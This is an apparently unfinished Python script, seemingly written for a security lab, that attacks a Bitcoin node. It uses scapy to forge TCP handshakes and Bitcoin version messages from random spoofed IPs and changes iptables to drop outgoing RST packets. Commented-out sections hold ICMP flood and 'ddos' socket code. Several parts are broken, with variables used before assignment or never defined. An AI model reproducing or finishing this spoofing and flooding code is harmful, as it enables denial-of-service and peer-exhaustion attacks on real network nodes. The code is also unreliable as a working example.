from _thread import start_new_thread
import atexit
#import time
import os
from scapy.all import *
#from impacket import ImpactDecoder, ImpactPacket


import socket, time, bitcoin
from bitcoin.messages import msg_version, msg_verack, msg_addr
from bitcoin.net import CAddress


victim_ip = '10.0.2.5'
victim_port = 833
attacker_port = 833

pending_spoof_IPs = []
successful_spoof_IPs = []

#pld_VERSION = '\xf9\xbe\xb4\xd9version\x00\x00\x00\x00\x00\x00\x00\x00\x00]\xf6\xe0\xe2'


iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
print(iptables_file_path)

def terminal(cmd):
	print('\n> '+cmd)
	print(os.popen(cmd).read())

def random_ip():
	return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))

def version_pkt(src_ip, dst_ip, port):
    msg = msg_version()
    msg.nVersion = 70015 # Most up-to-date as of 3/20/20
    msg.addrFrom.ip = src_ip
    msg.addrFrom.port = port
    msg.addrTo.ip = dst_ip
    msg.addrTo.port = port
    return msg

def spoof(src_ip, dst_ip):
	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
	src_port = attacker_port
	dst_port = victim_port

	ip = IP(src = src_ip, dst = dst_ip)
	SYN = TCP(sport=src_port, dport=dst_port, flags='A', seq=seq)
	SYNACK=sr1(ip/SYN)
	send(SYNACK)
	#pkt_spoof = ip/tcp

	print('Handshake COMPLETE')

	
	#s = socket.socket()#socket.AF_INET, socket.SOCK_STREAM)
	#s.bind((src_ip, 0))
	connect((dst_ip, dst_port))
	# Send version packet
	send(version_pkt(src_ip, dst_ip, dst_port).to_bytes())
	# Get verack packet
	print('\n\n*** ')
	print(recv(1924))
	# Send verack packet
	
	send(msg_verack().to_bytes())
	# Get verack packet
	print('\n\n*** ')
	print(recv(1024))


	print('\n\n*** ')
	print('CONNECTION ESTABLISHED')

	time.sleep(5)
	s.close()

	print('CONNECTION CLOSED')


	#try:
	#	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	#packet = IP(dst=dst_ip, src=src_ip) / TCP(dport=dst_port, sport=src_port, flags='S') / pld_VERSION
	#	s.connect((dst_ip, dst_port))
	
	#send(packet)

	#except Exception as e:
	#	raise e
	'''
	ip = ImpactPacket.IP()
	ip.set_ip_src(src_ip)
	ip.set_ip_dst(dst_ip)

	# Create a new ICMP packet
	icmp = ImpactPacket.ICMP()
	icmp.set_icmp_type(icmp.ICMP_ECHO)

	#inlude a small payload inside the ICMP packet
	#and have the ip packet contain the ICMP packet
	icmp.contains(ImpactPacket.Data("O"*100))
	ip.contains(icmp)
	n = 0

	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

	#Using ImpactPacket to flood/spoof
	icmp.set_icmp_id(1)
	#calculate checksum
	icmp.set_icmp_cksum(0)
	icmp.auto_checksum = 0
	s.sendto(ip.get_packet(), (dst, 8080))

	#Regular socket connection
	ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ddos.connect((target_ip, port))
	ddos.send("GET /%s HTTP/1.1\r\n" % message)
	'''

	#packet.show()
	return

def initialize_connection(victim_ip):
	spoof_ip = random_ip()
	pending_spoof_IPs.append(spoof_ip)

	# Remove all entries
	#sudo iptables -F

	#terminal(f'iptables -t raw -A PREROUTING -p tcp -d {spoof_ip} -j DROP')
	#terminal(f'iptables -t raw -A PREROUTING -p tcp --sport {victim_port} -j DROP')

	#terminal(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {spoof_ip} -j DROP')
	#terminal(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {spoof_ip} -d {victim_ip} -dport {victim_port} -j DROP')
	#terminal(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {victim_ip} -d {spoof_ip} -dport {attacker_port} -j DROP')
	#terminal(f'iptables -A OUTPUT -s {spoof_ip} -d {victim_ip} -p ICMP --icmp-type port-unreachable -j DROP')

	spoof(src_ip = spoof_ip, dst_ip = victim_ip)

def cleanup_iptables():
	if(os.path.exists(iptables_file_path)):
		terminal(f'iptables-restore < {iptables_file_path}')
		os.remove(iptables_file_path)
		print('Cleaning up IP table')

def backup_iptables():
	terminal(f'iptables-save > {iptables_file_path}')


def packet_received(packet):
	try:
		magic_number = packet.load[0:4]
		if magic_number != b'\xf9\xbe\xb4\xd9':
			return # Only allow Bitcoin messages
	except:
		return

	# Filter out sources that are not the victim
	#if packet[IP].src != victim_ip:
	#	return
	# Filter out destinations that are not a spoofed IP
	#if not packet[IP].dst in unprocessed_IPs:
	#	return

	#packet.show()
	#packet.show2()
	msgtype = packet.load[4:16].decode()
	print(f'src={packet[IP].src}, dst={packet[IP].dst}, msg={msgtype}')

	if msgtype == 'verack':
		# Successful connection! Move from pending to successful
		pass
	elif msgtype == 'ping':
		# send pong
		pass


if __name__ == '__main__':
	atexit.register(cleanup_iptables)
	cleanup_iptables()
	backup_iptables()
	terminal('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
	#terminal('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s SPOOFIP -dport PORT -j DROP')
	time.sleep(10)
	try:
		start_new_thread(sniff, (), {
			'iface':'enp0s3',
			'prn':packet_received,
			'filter':'tcp',
			'store':1
		})
	except:
		print('Error: unable to start thread')

	for i in range(1, 10 + 1):
		print(f'\n\nPacket #{i}')
		initialize_connection(victim_ip = victim_ip)

	while 1:
		time.sleep(1)

	# Simeon Home
	#sniff(iface="enp0s3",prn=packet_received, filter="tcp", store=1) #L
	#sniff(iface="wlp2s0",prn=packet_received, filter="tcp", store=1)

	# Cybersecurity Lab
	#sniff(iface="enp0s3",prn=packet_received, filter="tcp", store=1)
